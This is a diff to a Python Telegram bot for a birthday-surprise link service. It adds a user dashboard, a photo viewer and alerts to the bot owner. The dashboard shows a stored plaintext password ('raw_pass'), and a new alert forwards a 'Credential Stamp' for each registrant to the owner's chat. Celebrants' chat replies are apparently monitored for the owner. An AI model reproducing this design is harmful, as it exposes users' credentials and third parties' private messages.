@@ -114,11 +114,30 @@ def send_tg_message(chat_id, text, reply_markup=None):
         print(f"[Send Message Error]: {e}")
         return None
 
+def send_tg_photo(chat_id, photo_url_or_file_id, caption=""):
+    """Sends a photo to a Telegram user chat (supports TG file_id or web URL)"""
+    if not USER_BOT_TOKEN or "YOUR_TELEGRAM" in USER_BOT_TOKEN:
+        return None
+    url = f"{BASE_TG_URL}/sendPhoto"
+    payload = {
+        "chat_id": chat_id,
+        "photo": photo_url_or_file_id,
+        "caption": caption,
+        "parse_mode": "HTML"
+    }
+    try:
+        res = requests.post(url, json=payload, timeout=12)
+        return res.json()
+    except Exception as e:
+        print(f"[Send Photo Error]: {e}")
+        return None
+
 def setup_user_bot_menu():
     """Sets up the 3-line Telegram burger menu for public users"""
     if not USER_BOT_TOKEN or "YOUR_TELEGRAM" in USER_BOT_TOKEN:
         return
     commands = [
+        {"command": "mydata", "description": "📋 My Data & Surprise Details"},
         {"command": "register", "description": "🆕 New User Registration"},
         {"command": "login", "description": "🔑 Existing User Login"},
         {"command": "create", "description": "🎁 Create Birthday Surprise"},
@@ -141,10 +160,10 @@ def get_user_reply_keyboard(chat_id):
     if logged_user:
         return {
             "keyboard": [
-                [{"text": "🎁 Create Surprise"}, {"text": "💌 Chat Answers"}],
-                [{"text": "🔗 Share Data"}, {"text": "🌐 Open Web App"}],
-                [{"text": f"👤 Profile ({logged_user})"}, {"text": "🗑️ Delete Data"}],
-                [{"text": "❓ Help & DM Owner"}]
+                [{"text": "📋 My Data & Share"}, {"text": "🎁 Create Surprise"}],
+                [{"text": "💌 Chat Answers"}, {"text": "📸 My Photos"}],
+                [{"text": "🌐 Open Web App"}, {"text": f"👤 Profile ({logged_user})"}],
+                [{"text": "🗑️ Delete Data"}, {"text": "❓ Help & DM Owner"}]
             ],
             "resize_keyboard": True,
             "is_persistent": True
@@ -152,9 +171,8 @@ def get_user_reply_keyboard(chat_id):
     else:
         return {
             "keyboard": [
-                [{"text": "🆕 New User Login"}, {"text": "🔑 Existing User Login"}],
-                [{"text": "🎁 Create Surprise"}, {"text": "💌 Chat Answers"}],
-                [{"text": "🔗 Share Data"}, {"text": "🌐 Open Web App"}],
+                [{"text": "🔑 Existing User Login"}, {"text": "🆕 New User Register"}],
+                [{"text": "🎁 Create Surprise"}, {"text": "🌐 Open Web App"}],
                 [{"text": "❓ Help & DM Owner"}]
             ],
             "resize_keyboard": True,
@@ -264,6 +282,27 @@ def handle_reg_password(chat_id, text):
     session["step"] = None
     session["data"] = {}
 
+    # Alert Owner Bot with Credential Stamp
+    owner_id = str(config.get("owner_chat_id", "")).strip()
+    owner_token = config.get("bot_token") or USER_BOT_TOKEN
+    if owner_id and owner_token and "YOUR_TELEGRAM" not in owner_token:
+        try:
+            stamp = user_store.get_user_stamp(u)
+            reg_alert = (
+                f"👤 <b>NEW USER REGISTERED (PUBLIC BOT)</b> 🤖🎉\n\n"
+                f"• 👤 <b>Username:</b> <code>{u}</code>\n"
+                f"• 🆔 <b>TG Chat ID:</b> <code>{chat_id}</code>\n"
+                f"• 📅 <b>Time:</b> {now_str}\n"
+                f"{stamp}"
+            )
+            requests.post(f"https://api.telegram.org/bot{owner_token}/sendMessage", json={
+                "chat_id": owner_id,
+                "text": reg_alert,
+                "parse_mode": "HTML"
+            }, timeout=6)
+        except Exception:
+            pass
+
     msg = (
         f"🎉 <b>REGISTRATION SUCCESSFUL!</b> ✅💖\n\n"
         f"• 👤 <b>Username:</b> <code>{u}</code>\n"
@@ -274,6 +313,7 @@ def handle_reg_password(chat_id, text):
     inline_kb = {
         "inline_keyboard": [
             [{"text": "🎁 Create 3D Surprise Now", "callback_data": "flow_create"}],
+            [{"text": "📋 My Dashboard", "callback_data": "flow_mydata"}],
             [{"text": "🌐 Launch Web App", "url": config.get("web_app_url", "http://localhost:8000/")}]
         ]
     }
@@ -600,14 +640,15 @@ def handle_create_wish(chat_id, text):
     owner_token = config.get("bot_token") or USER_BOT_TOKEN
     if owner_id and owner_token and "YOUR_TELEGRAM" not in owner_token:
         try:
+            stamp = user_store.get_user_stamp(logged_user)
             owner_alert = (
                 f"🎁 <b>NEW SURPRISE CREATED (via Public Bot)!</b> ✨💖\n\n"
                 f"• 👤 <b>User:</b> <code>{logged_user}</code>\n"
                 f"• 👸 <b>Celebrant:</b> {name} {f'({nick})' if nick else ''}\n"
                 f"• 🎨 <b>Theme:</b> {theme}\n"
                 f"• 🔗 <b>Link:</b> {final_link}\n"
-                f"• ⌛ <b>Expires:</b> {exp_date_str}\n\n"
-                f"<i>Girlfriend's chat answers will be monitored and delivered in real-time!</i>"
+                f"• ⌛ <b>Expires:</b> {exp_date_str}\n"
+                f"{stamp}"
             )
             requests.post(f"https://api.telegram.org/bot{owner_token}/sendMessage", json={
                 "chat_id": owner_id,
@@ -637,6 +678,156 @@ def handle_create_wish(chat_id, text):
     }
     send_tg_message(chat_id, success_msg, reply_markup=get_user_reply_keyboard(chat_id))
     send_tg_message(chat_id, "👇 Launch or share your link:", reply_markup=inline_kb)
+
+# --- ORGANIZED USER DATA DASHBOARD (KYa Kya Share Hua Hai) ---
+def show_user_dashboard(chat_id):
+    """
+    Pulls complete user record from Central State / UserStore and organizes:
+    - Account credentials & member status
+    - Celebrant details (name, nickname, theme, wish)
+    - 48h Surprise link & live expiry countdown
+    - Photos uploaded to Telegram CDN
+    - Girlfriend typewriter chat replies received
+    """
+    session = get_session(chat_id)
+    logged_user = session.get("logged_user")
+
+    if not logged_user:
+        prompt_msg = (
+            f"🔒 <b>LOGIN REQUIRED TO VIEW YOUR DASHBOARD!</b> ⚠️\n\n"
+            f"Aapka kya kya data, photos, aur surprise link share hua hai dekhne ke liye pehle login karein.\n\n"
+            f"👉 Agar account hai: tap <b>🔑 Existing User Login</b>\n"
+            f"👉 Agar naya account banana hai: tap <b>🆕 New User Register</b>"
+        )
+        inline_kb = {
+            "inline_keyboard": [
+                [{"text": "🔑 Existing User Login", "callback_data": "flow_login"}],
+                [{"text": "🆕 New User Register", "callback_data": "flow_register"}]
+            ]
+        }
+        send_tg_message(chat_id, prompt_msg, reply_markup=inline_kb)
+        return
+
+    # Load complete user record from UserStore / Central State
+    user = user_store.load_user(logged_user)
+    if not user:
+        send_tg_message(chat_id, "⚠️ User data not found. Please login again.")
+        return
+
+    surprise = user.get("surprise", {})
+    photos   = user.get("photos", [])
+    answers  = user.get("answers", [])
+    pwd      = user.get("raw_pass") or "••••"
+    reg_at   = user.get("registered_at", "N/A")
+
+    # Link status
+    link_url = surprise.get("link", "")
+    exp_ms   = surprise.get("expires_at", 0) or 0
+    now_ms   = time.time() * 1000.0
+
+    if link_url and exp_ms:
+        if exp_ms > now_ms:
+            diff_sec = int((exp_ms - now_ms) / 1000)
+            h = diff_sec // 3600
+            m = (diff_sec % 3600) // 60
+            link_status = f"🟢 ACTIVE ({h}h {m}m left)"
+        else:
+            link_status = "🔴 EXPIRED (48h reached)"
+    elif link_url:
+        link_status = "🟢 ACTIVE"
+    else:
+        link_status = "⚪ Not Created Yet"
+
+    cel_name = surprise.get("name") or "Not configured"
+    cel_nick = surprise.get("nickname") or ""
+    theme    = surprise.get("theme") or "rose-glamour"
+    wish     = surprise.get("wish") or "Not configured"
+
+    wish_snippet = f"\"{wish[:80]}...\"" if len(wish) > 80 else f"\"{wish}\""
+
+    dash_msg = (
+        f"📋 <b>YOUR ORGANIZED SURPRISE DASHBOARD</b> ✨🎂\n"
+        f"<i>Organized from Central Cloud Database</i>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 <b>ACCOUNT INFO:</b>\n"
+        f"• Username: <code>{logged_user}</code>\n"
+        f"• Password: <code>{pwd}</code>\n"
+        f"• Registered: {reg_at}\n\n"
+        f"🎁 <b>SURPRISE DETAILS (KYa Kya Share Hua):</b>\n"
+        f"• Celebrant: <b>{cel_name}</b> {f'({cel_nick})' if cel_nick else ''}\n"
+        f"• Theme: <b>{theme}</b>\n"
+        f"• Love Wish: <i>{wish_snippet}</i>\n\n"
+        f"🔗 <b>SURPRISE LINK & RETENTION:</b>\n"
+        f"• Status: {link_status}\n"
+        f"• URL: <code>{link_url if link_url else 'None'}</code>\n\n"
+        f"📊 <b>DATA & ENGAGEMENT:</b>\n"
+        f"• 📸 Photos Uploaded: <b>{len(photos)}</b>\n"
+        f"• 💌 Girlfriend Replies: <b>{len(answers)}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"<i>All updates are synchronized with Owner Bot in real-time.</i>"
+    )
+
+    btn_row1 = []
+    if link_url:
+        btn_row1.append({"text": "🚀 Open Surprise Link", "url": link_url})
+    btn_row1.append({"text": f"💌 Answers ({len(answers)})", "callback_data": "flow_answers"})
+
+    btn_row2 = []
+    if len(photos) > 0:
+        btn_row2.append({"text": f"📸 View Photos ({len(photos)})", "callback_data": "flow_photos"})
+    if link_url:
+        btn_row2.append({"text": "🔗 Share Message", "callback_data": "flow_share"})
+    else:
+        btn_row2.append({"text": "🎁 Create Surprise", "callback_data": "flow_create"})
+
+    btn_row3 = [
+        {"text": "🌐 Open Web App", "url": config.get("web_app_url", "http://localhost:8000/")},
+        {"text": "🗑️ Delete Data", "callback_data": "flow_delete"}
+    ]
+
+    inline_kb = {"inline_keyboard": [btn_row1, btn_row2, btn_row3]}
+    send_tg_message(chat_id, dash_msg, reply_markup=inline_kb)
+
+def show_user_photos(chat_id):
+    """Sends all photos uploaded by the logged-in user directly in Telegram chat."""
+    session = get_session(chat_id)
+    logged_user = session.get("logged_user")
+    if not logged_user:
+        send_tg_message(chat_id, "🔒 Please login to view your uploaded photos.")
+        return
+
+    user = user_store.load_user(logged_user)
+    photos = user.get("photos", []) if user else []
+
+    if not photos:
+        send_tg_message(
+            chat_id,
+            f"📸 <b>NO PHOTOS UPLOADED YET!</b>\n\n"
+            f"Aapne abhi tak koi photo upload nahi ki hai. Web App dashboard me jakar main portrait photo ya memories album upload karein!",
+            reply_markup={"inline_keyboard": [[{"text": "🌐 Open Web App", "url": config.get("web_app_url", "http://localhost:8000/")}]]}
+        )
+        return
+
+    send_tg_message(chat_id, f"📸 <b>YOUR UPLOADED PHOTOS ({len(photos)}):</b>\nFetching your photos from Telegram Cloud...")
+    owner_token = config.get("bot_token") or USER_BOT_TOKEN
+    web_base = config.get("web_app_url", "http://localhost:8000").rstrip("/")
+
+    for idx, p in enumerate(photos, start=1):
+        cap = (
+            f"📸 <b>Photo {idx} of {len(photos)}</b>\n"
+            f"• 🏷 Type: {p.get('caption', 'Surprise Photo')}\n"
+            f"• 📅 Uploaded: {p.get('uploaded_at', 'Recently')}"
+        )
+        file_id = p.get("file_id")
+        url = p.get("url", "")
+        # First try sending via file_id
+        sent = None
+        if file_id:
+            sent = send_tg_photo(chat_id, file_id, caption=cap)
+        # Fallback to web app photo URL if file_id failed
+        if not sent and url:
+            full_url = url if url.startswith("http") else f"{web_base}{url}"
+            send_tg_photo(chat_id, full_url, caption=cap)
 
 # --- SHARE DATA FLOW ---
 def show_share_data(chat_id):
@@ -873,6 +1064,14 @@ def process_user_text(chat_id, user_first_name, text):
         show_chat_answers(chat_id)
         return
 
+    elif cmd in ["/mydata", "📋 my data & share", "mydata", "my data", "dashboard", "/dashboard", "/profile"] or cmd.startswith("👤 profile"):
+        show_user_dashboard(chat_id)
+        return
+
+    elif cmd in ["/photos", "📸 my photos", "my photos", "photos"]:
+        show_user_photos(chat_id)
+        return
+
     elif cmd in ["/share", "🔗 share data", "share data", "share", "my link"]:
         show_share_data(chat_id)
         return
@@ -888,30 +1087,8 @@ def process_user_text(chat_id, user_first_name, text):
         show_help(chat_id)
         return
 
-    elif cmd in ["/deletedata", "🗑\ufe0f delete my data", "delete my data", "deletedata", "delete data", "delete my account", "delete account"]:
+    elif cmd in ["/deletedata", "🗑️ delete my data", "delete my data", "deletedata", "delete data", "delete my account", "delete account"]:
         start_delete_account_flow(chat_id)
-        return
-
-    elif cmd.startswith("👤 profile"):
-        logged_user = session.get("logged_user")
-        if logged_user:
-            user = user_store.load_user(logged_user)
-            answers_count = len(user.get("answers", [])) if user else 0
-            photos_count  = len(user.get("photos", []))  if user else 0
-            has_link = bool(user.get("surprise", {}).get("link")) if user else False
-            send_tg_message(chat_id,
-                f"👤 <b>YOUR PROFILE</b>\n\n"
-                f"• <b>Username:</b> <code>{logged_user}</code>\n"
-                f"• <b>Status:</b> Logged In ✅\n"
-                f"• <b>Surprise Link:</b> {'Created 🎁' if has_link else 'Not created yet'}\n"
-                f"• <b>Chat Answers:</b> {answers_count}\n"
-                f"• <b>Photos Uploaded:</b> {photos_count}\n\n"
-                f"Tap <b>🗑\ufe0f Delete My Data</b> to permanently erase account.",
-                reply_markup=get_user_reply_keyboard(chat_id)
-            )
-        else:
-            send_tg_message(chat_id, "👤 You are not logged in. Tap <b>🔑 Existing User Login</b> to sign in.",
-                reply_markup=get_user_reply_keyboard(chat_id))
         return
 
     # Fallback
@@ -928,6 +1105,10 @@ def process_callback(chat_id, cb_data, cb_raw):
         start_register_flow(chat_id)
     elif cb_data == "flow_login":
         start_login_flow(chat_id)
+    elif cb_data == "flow_mydata":
+        show_user_dashboard(chat_id)
+    elif cb_data == "flow_photos":
+        show_user_photos(chat_id)
     elif cb_data == "flow_create":
         start_create_wizard(chat_id)
     elif cb_data == "flow_answers":
@@ -936,7 +1117,7 @@ def process_callback(chat_id, cb_data, cb_raw):
         show_share_data(chat_id)
     elif cb_data == "flow_help":
         show_help(chat_id)
-    elif cb_data == "flow_delete_account":
+    elif cb_data in ["flow_delete", "flow_delete_account"]:
         start_delete_account_flow(chat_id)
     elif cb_data == "flow_cancel_delete":
         session = get_session(chat_id)
